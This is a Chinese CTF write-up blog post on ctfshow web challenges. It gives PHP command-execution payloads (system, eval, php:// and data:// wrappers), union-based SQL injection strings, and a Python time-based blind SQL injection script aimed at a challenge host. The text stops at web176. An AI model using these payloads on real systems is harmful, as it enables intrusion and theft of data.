<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>CTFSHOW 做题记录 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="CTFSHOW 做题记录">
<meta property="og:description" content="2024.11.13重刷ctfshow题目，此文为记录"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-13T13:28:33+08:00"><meta property="article:modified_time" content="2024-11-13T13:28:33+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="CTFSHOW 做题记录"><meta name=twitter:description content="2024.11.13重刷ctfshow题目，此文为记录"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/><link rel=prev href=https://nexuzzz0.github.io/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/><link rel=next href=https://nexuzzz0.github.io/posts/wp/buuctf-web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTFSHOW 做题记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/wp\/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/"},"genre":"posts","keywords":"ctfshow, wp","wordcount":5697,"url":"https:\/\/nexuzzz0.github.io\/posts\/wp\/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/","datePublished":"2024-11-13T13:28:33+08:00","dateModified":"2024-11-13T13:28:33+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#信息搜集>信息搜集</a><ul><li><a href=#web1>web1</a></li><li><a href=#web2>web2</a></li><li><a href=#web3>web3</a></li><li><a href=#web4>web4</a></li><li><a href=#web5>web5</a></li><li><a href=#web6>web6</a></li><li><a href=#web7>web7</a></li><li><a href=#web8>web8</a></li><li><a href=#web9>web9</a></li><li><a href=#web10>web10</a></li><li><a href=#web11>web11</a></li><li><a href=#web12>web12</a></li><li><a href=#web13>web13</a></li><li><a href=#web14>web14</a></li><li><a href=#web15>web15</a></li><li><a href=#web16>web16</a></li><li><a href=#web17>web17</a></li><li><a href=#web18>web18</a></li><li><a href=#web19>web19</a></li><li><a href=#web20>web20</a></li></ul></li><li><a href=#爆破>爆破</a><ul><li><a href=#web21>web21</a></li><li><a href=#web22>web22</a></li></ul></li><li><a href=#命令执行>命令执行</a><ul><li><a href=#web29>web29</a></li><li><a href=#web30>web30</a></li><li><a href=#web31>web31</a></li><li><a href=#web32>web32</a></li><li><a href=#web33>web33</a></li><li><a href=#web34>web34</a></li><li><a href=#web35>web35</a></li><li><a href=#web36>web36</a></li><li><a href=#web37>web37</a></li><li><a href=#web38>web38</a></li><li><a href=#web39>web39</a></li><li><a href=#web40>web40</a></li><li><a href=#web41>web41</a></li></ul></li><li><a href=#sql注入>sql注入</a><ul><li><a href=#web171>web171</a></li><li><a href=#web172>web172</a></li><li><a href=#web173>web173</a></li><li><a href=#web174>web174</a></li><li><a href=#web175>web175</a></li><li><a href=#web176>web176</a></li></ul></li><li><a href=#反序列化>反序列化</a><ul><li><a href=#web254>web254</a></li><li><a href=#web255>web255</a></li><li><a href=#web256>WEB256</a></li><li><a href=#web257>web257</a></li><li><a href=#web258>web258</a></li><li><a href=#web259>web259</a></li><li><a href=#web260>web260</a></li><li><a href=#web261>web261</a></li><li><a href=#web262>web262</a></li><li><a href=#web263>web263</a></li><li><a href=#web264>web264</a></li><li><a href=#web265>web265</a></li><li><a href=#web266>web266</a></li><li><a href=#web267>web267</a></li><li><a href=#web268>web268</a></li><li><a href=#web269>web269</a></li><li><a href=#web270>web270</a></li><li><a href=#web271>web271</a></li><li><a href=#web272>web272</a></li><li><a href=#web273>web273</a></li><li><a href=#web274>web274</a></li><li><a href=#web275>web275</a></li><li><a href=#web276>web276</a></li><li><a href=#web277>web277</a></li><li><a href=#web278>web278</a></li></ul></li><li><a href=#xxe>XXE</a><ul><li><a href=#web373>web373</a></li><li><a href=#web374>web374</a></li></ul></li></ul><ul><li><a href=#图片篇基础操作>图片篇(基础操作)</a><ul><li><a href=#misc1>misc1</a></li><li><a href=#misc2>misc2</a></li><li><a href=#misc3>misc3</a></li><li><a href=#misc4>misc4</a></li></ul></li><li><a href=#图片篇信息附加>图片篇(信息附加)</a><ul><li><a href=#misc5>misc5</a></li><li><a href=#misc6>misc6</a></li><li><a href=#misc7>misc7</a></li><li><a href=#misc8>misc8</a></li><li><a href=#misc9>misc9</a></li><li><a href=#misc10>misc10</a></li></ul></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTFSHOW 做题记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=13131-1111-1311>13131-1111-1311</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=13131-1111-1311>13131-1111-1311</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5697 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 12 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#信息搜集>信息搜集</a><ul><li><a href=#web1>web1</a></li><li><a href=#web2>web2</a></li><li><a href=#web3>web3</a></li><li><a href=#web4>web4</a></li><li><a href=#web5>web5</a></li><li><a href=#web6>web6</a></li><li><a href=#web7>web7</a></li><li><a href=#web8>web8</a></li><li><a href=#web9>web9</a></li><li><a href=#web10>web10</a></li><li><a href=#web11>web11</a></li><li><a href=#web12>web12</a></li><li><a href=#web13>web13</a></li><li><a href=#web14>web14</a></li><li><a href=#web15>web15</a></li><li><a href=#web16>web16</a></li><li><a href=#web17>web17</a></li><li><a href=#web18>web18</a></li><li><a href=#web19>web19</a></li><li><a href=#web20>web20</a></li></ul></li><li><a href=#爆破>爆破</a><ul><li><a href=#web21>web21</a></li><li><a href=#web22>web22</a></li></ul></li><li><a href=#命令执行>命令执行</a><ul><li><a href=#web29>web29</a></li><li><a href=#web30>web30</a></li><li><a href=#web31>web31</a></li><li><a href=#web32>web32</a></li><li><a href=#web33>web33</a></li><li><a href=#web34>web34</a></li><li><a href=#web35>web35</a></li><li><a href=#web36>web36</a></li><li><a href=#web37>web37</a></li><li><a href=#web38>web38</a></li><li><a href=#web39>web39</a></li><li><a href=#web40>web40</a></li><li><a href=#web41>web41</a></li></ul></li><li><a href=#sql注入>sql注入</a><ul><li><a href=#web171>web171</a></li><li><a href=#web172>web172</a></li><li><a href=#web173>web173</a></li><li><a href=#web174>web174</a></li><li><a href=#web175>web175</a></li><li><a href=#web176>web176</a></li></ul></li><li><a href=#反序列化>反序列化</a><ul><li><a href=#web254>web254</a></li><li><a href=#web255>web255</a></li><li><a href=#web256>WEB256</a></li><li><a href=#web257>web257</a></li><li><a href=#web258>web258</a></li><li><a href=#web259>web259</a></li><li><a href=#web260>web260</a></li><li><a href=#web261>web261</a></li><li><a href=#web262>web262</a></li><li><a href=#web263>web263</a></li><li><a href=#web264>web264</a></li><li><a href=#web265>web265</a></li><li><a href=#web266>web266</a></li><li><a href=#web267>web267</a></li><li><a href=#web268>web268</a></li><li><a href=#web269>web269</a></li><li><a href=#web270>web270</a></li><li><a href=#web271>web271</a></li><li><a href=#web272>web272</a></li><li><a href=#web273>web273</a></li><li><a href=#web274>web274</a></li><li><a href=#web275>web275</a></li><li><a href=#web276>web276</a></li><li><a href=#web277>web277</a></li><li><a href=#web278>web278</a></li></ul></li><li><a href=#xxe>XXE</a><ul><li><a href=#web373>web373</a></li><li><a href=#web374>web374</a></li></ul></li></ul><ul><li><a href=#图片篇基础操作>图片篇(基础操作)</a><ul><li><a href=#misc1>misc1</a></li><li><a href=#misc2>misc2</a></li><li><a href=#misc3>misc3</a></li><li><a href=#misc4>misc4</a></li></ul></li><li><a href=#图片篇信息附加>图片篇(信息附加)</a><ul><li><a href=#misc5>misc5</a></li><li><a href=#misc6>misc6</a></li><li><a href=#misc7>misc7</a></li><li><a href=#misc8>misc8</a></li><li><a href=#misc9>misc9</a></li><li><a href=#misc10>misc10</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>2024.11.13重刷ctfshow题目，此文为记录</p><h1 id=web入门 class=headerLink><a href=#web%e5%85%a5%e9%97%a8 class=header-mark></a>WEB入门</h1><h2 id=信息搜集 class=headerLink><a href=#%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86 class=header-mark></a>信息搜集</h2><h3 id=web1 class=headerLink><a href=#web1 class=header-mark></a>web1</h3><p>Ctrl+U看源码</p><h3 id=web2 class=headerLink><a href=#web2 class=header-mark></a>web2</h3><p>不能右键，继续Ctrl+U看源码</p><h3 id=web3 class=headerLink><a href=#web3 class=header-mark></a>web3</h3><p>请求包返回头里面<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710360.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web4 class=headerLink><a href=#web4 class=header-mark></a>web4</h3><p>提示看 robots.txt 发现提示 /flagishere.txt 直接访问 flag 在里面</p><h3 id=web5 class=headerLink><a href=#web5 class=header-mark></a>web5</h3><p>提示 phps源码泄露有时候能帮上忙<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710362.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web6 class=headerLink><a href=#web6 class=header-mark></a>web6</h3><p>提示源码泄露<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710363.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web7 class=headerLink><a href=#web7 class=header-mark></a>web7</h3><p>提示 版本控制很重要，但不要部署到生产环境更重要。
访问 <code>/.git/index.php</code></p><h3 id=web8 class=headerLink><a href=#web8 class=header-mark></a>web8</h3><p>提示 版本控制很重要，但不要部署到生产环境更重要。
访问 <code>/.svn/</code></p><h3 id=web9 class=headerLink><a href=#web9 class=header-mark></a>web9</h3><p>提示 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了
访问源码的缓存文件 index.php.swp<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710364.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web10 class=headerLink><a href=#web10 class=header-mark></a>web10</h3><p>给 flag 放cookie 里面了</p><h3 id=web11 class=headerLink><a href=#web11 class=header-mark></a>web11</h3><p>直接域名解析，我做的时候这个域名已经GG了<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710365.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web12 class=headerLink><a href=#web12 class=header-mark></a>web12</h3><p>访问robots.txt得到/admin/即后台登录路径，主页最下面那个帮助电话就是admin密码，登录即可</p><h3 id=web13 class=headerLink><a href=#web13 class=header-mark></a>web13</h3><p>提示 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p><p>翻到最下面可以看到INFORMATION那一列可以下载document，下载后里面有默认账号和密码admin和admin1103以及后台路径/system1103/login.php，登陆即可</p><h3 id=web14 class=headerLink><a href=#web14 class=header-mark></a>web14</h3><p>提示 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p><p>访问<code>/editor/</code>可以看到一个图标长得像回形针的插入文件功能，打开后选择文件空间即可遍历文件。最后访问<code>/nothinghere/fl000g.txt</code>即可拿到flag</p><h3 id=web15 class=headerLink><a href=#web15 class=header-mark></a>web15</h3><p>提示 公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p><p>网页最下面有个qq邮箱，查出来西安的，访问<code>/admin</code>，使用重置密码功能，密保问题是居住地，填西安后把密码重置为<code>admin7789</code>，然后登录即可</p><h3 id=web16 class=headerLink><a href=#web16 class=header-mark></a>web16</h3><p>提示 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>访问 <code>/tz.php</code> 这是版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h3 id=web17 class=headerLink><a href=#web17 class=header-mark></a>web17</h3><p>提示 备份的 sql 文件会泄露敏感信息
备份的sql文件，访问<code>/backup.sql</code></p><h3 id=web18 class=headerLink><a href=#web18 class=header-mark></a>web18</h3><p>一个小游戏，说玩到 101 分给 flag 那必然是不可能玩的
直接看源码<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710366.png 2x" sizes=auto alt=image.png></a></figure>访问<code>110.php</code>得到 flag</p><h3 id=web19 class=headerLink><a href=#web19 class=header-mark></a>web19</h3><p>看源码发现验证条件，直接 POST 提交出 flag<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710367.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web20 class=headerLink><a href=#web20 class=header-mark></a>web20</h3><p>提示 mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>直接查看url路径添加<code>/db/db.mdb</code> 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</p><h2 id=爆破 class=headerLink><a href=#%e7%88%86%e7%a0%b4 class=header-mark></a>爆破</h2><h3 id=web21 class=headerLink><a href=#web21 class=header-mark></a>web21</h3><p>非原字典</p><h3 id=web22 class=headerLink><a href=#web22 class=header-mark></a>web22</h3><p>域名失效</p><h2 id=命令执行 class=headerLink><a href=#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c class=header-mark></a>命令执行</h2><h3 id=web29 class=headerLink><a href=#web29 class=header-mark></a>web29</h3><p><code>?c=system('tac f*g.php');</code></p><h3 id=web30 class=headerLink><a href=#web30 class=header-mark></a>web30</h3><pre tabindex=0><code>?c=echo `tac f*`;
</code></pre><h3 id=web31 class=headerLink><a href=#web31 class=header-mark></a>web31</h3><pre tabindex=0><code>?c=passthru(&#34;tac%09fla*&#34;);
?c=eval($_GET[a]);&amp;a=system(&#39;cat flag.php&#39;);
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
</code></pre><h3 id=web32 class=headerLink><a href=#web32 class=header-mark></a>web32</h3><p><code>?c=include%0a$_GET[1]?>&amp;1=php://filter/convert.base64-encode/resource=flag.php</code>
嵌套eval+文件包含+伪协议</p><h3 id=web33 class=headerLink><a href=#web33 class=header-mark></a>web33</h3><p>同32</p><h3 id=web34 class=headerLink><a href=#web34 class=header-mark></a>web34</h3><p>多过滤 <code>:</code> <code>include</code>已经将语句闭合，不影响后面伪协议代码，payload同Web32</p><h3 id=web35 class=headerLink><a href=#web35 class=header-mark></a>web35</h3><p>多过滤 <code>&lt;</code> <code>=</code> payload同Web32</p><h3 id=web36 class=headerLink><a href=#web36 class=header-mark></a>web36</h3><p>多过滤 <code>/</code> 数字，将Web32的payload1改成a继续用</p><h3 id=web37 class=headerLink><a href=#web37 class=header-mark></a>web37</h3><p><code>?c=data://text/plain,&lt;?php system('tac fl*');?></code></p><h3 id=web38 class=headerLink><a href=#web38 class=header-mark></a>web38</h3><p><code>?c=data://text/plain,&lt;?= system('tac fl*');?></code></p><h3 id=web39 class=headerLink><a href=#web39 class=header-mark></a>web39</h3><p>强制给include添加后缀无法阻止伪协议内的php代码执行，只会在代码执行后报错
同38</p><h3 id=web40 class=headerLink><a href=#web40 class=header-mark></a>web40</h3><p>无参RCE<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710368.png 2x" sizes=auto alt=image.png></a></figure>还有一种方法
get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
next()将内部指针指向数组中的下一个元素，并输出。
array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710369.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web41 class=headerLink><a href=#web41 class=header-mark></a>web41</h3><h2 id=sql注入 class=headerLink><a href=#sql%e6%b3%a8%e5%85%a5 class=header-mark></a>sql注入</h2><h3 id=web171 class=headerLink><a href=#web171 class=header-mark></a>web171</h3><p>万能密码一把
<code>1' or 1=1--+</code></p><h3 id=web172 class=headerLink><a href=#web172 class=header-mark></a>web172</h3><p><code>1' union select 1,password from ctfshow_user2--+</code></p><h3 id=web173 class=headerLink><a href=#web173 class=header-mark></a>web173</h3><p>字段多了一个
<code>1' union select 1,2,password from ctfshow_user3--+</code></p><h3 id=web174 class=headerLink><a href=#web174 class=header-mark></a>web174</h3><p>过滤数字和 flag ，把输出结果中的数字进行替换</p><pre tabindex=0><code>1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;A&#39;),2,&#39;B&#39;),3,&#39;C&#39;),4,&#39;D&#39;),5,&#39;E&#39;),6,&#39;F&#39;),7,&#39;G&#39;),8,&#39;H&#39;),9,&#39;I&#39;),0,&#39;J&#39;),&#39;b&#39; from ctfshow_user4 where username=&#39;flag&#39; %23
</code></pre><p>得到：</p><pre tabindex=0><code>ctfshow{bcCBHAEC-fCaG-DCdJ-IFCd-CGbEEBHBfJFB}
</code></pre><p>替换回去</p><pre tabindex=0><code>def restore_password(encrypted_password):
    # 替换规则，按照原SQL语句逆向操作
    replacements = {
        &#39;A&#39;: &#39;1&#39;,
        &#39;B&#39;: &#39;2&#39;,
        &#39;C&#39;: &#39;3&#39;,
        &#39;D&#39;: &#39;4&#39;,
        &#39;E&#39;: &#39;5&#39;,
        &#39;F&#39;: &#39;6&#39;,
        &#39;G&#39;: &#39;7&#39;,
        &#39;H&#39;: &#39;8&#39;,
        &#39;I&#39;: &#39;9&#39;,
        &#39;J&#39;: &#39;0&#39;,
    }
    
    # 恢复字符串
    restored = &#39;&#39;.join(replacements.get(char, char) for char in encrypted_password)
    return restored

# 示例加密字符串
encrypted = &#34;ctfshow{bcCBHAEC-fCaG-DCdJ-IFCd-CGbEEBHBfJFB}&#34;
# 提取大括号中的内容
content = encrypted.split(&#39;{&#39;)[1].split(&#39;}&#39;)[0]

# 恢复字符串
restored_password = restore_password(content)

print(f&#34;加密字符串: {encrypted}&#34;)
print(f&#34;恢复后的字符串: {restored_password}&#34;)


#ctfshow{bc328153-f3a7-43d0-963d-37b55282f062}
</code></pre><h3 id=web175 class=headerLink><a href=#web175 class=header-mark></a>web175</h3><pre tabindex=0><code>import time
import requests

dicts=&#39;1234567890-_{}qwertyuiopasdfghjklzxcvbnm&#39;

flag = &#39;&#39;

for i in range(1,64):
    for s in dicts:
        sql= &#39;1\&#39; and if(substr((select password from ctfshow_user5 where username=\&#39;flag\&#39;),{},1)=\&#39;{}\&#39;,sleep(3),0) %23&#39;.format(i,s)
        url = &#39;http://d2a0c671-e4d9-4ecb-b011-90a5fc68b498.challenge.ctf.show/api/v5.php?id={}&amp;page=1&amp;limit=1&#39;.format(sql)
        start_time = time.time()
        res = requests.get(url)
        stop_time = time.time()
        if stop_time - start_time &gt;= 3:
            flag += s
            print(flag)
            break
</code></pre><h3 id=web176 class=headerLink><a href=#web176 class=header-mark></a>web176</h3><p>大小写绕过
